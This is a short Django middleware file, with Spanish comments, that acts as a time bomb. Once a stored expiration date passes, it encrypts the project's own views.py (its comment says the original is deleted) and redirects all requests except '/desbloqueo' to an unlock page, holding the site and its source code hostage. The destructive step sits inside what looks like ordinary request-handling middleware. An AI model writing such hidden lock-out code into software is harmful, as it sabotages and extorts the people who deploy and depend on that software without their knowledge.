# middlewares.py

from django.conf import settings
from django.shortcuts import redirect
from django.utils import timezone

from buscador.crypto_utils import cifrar_archivo
import os

class BloqueoPorFechaMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        from buscador.models import ExpiracionConfig
        fecha_actual = timezone.now().date()
        exp = ExpiracionConfig.objects.first()
        if exp:
            fecha_exp = exp.fecha_expiracion
        else:
            from datetime import date
            fecha_exp = date(2099, 1, 1)  # Fecha lejana para no bloquear por error
        ruta_views = os.path.join(settings.BASE_DIR, 'buscador', 'views.py')
        ruta_views_enc = ruta_views + '.enc'

        # Si la fecha actual es posterior o igual a la fecha de expiración
        if fecha_actual >= fecha_exp:
            # Si views.py no está cifrado, lo ciframos y borramos el original
            if os.path.exists(ruta_views) and not os.path.exists(ruta_views_enc):
                cifrar_archivo(ruta_views)
            # Solo permitimos acceso a la vista de desbloqueo
            if not request.path.startswith('/desbloqueo'):
                return redirect('desbloqueo')

        response = self.get_response(request)
        return response
    
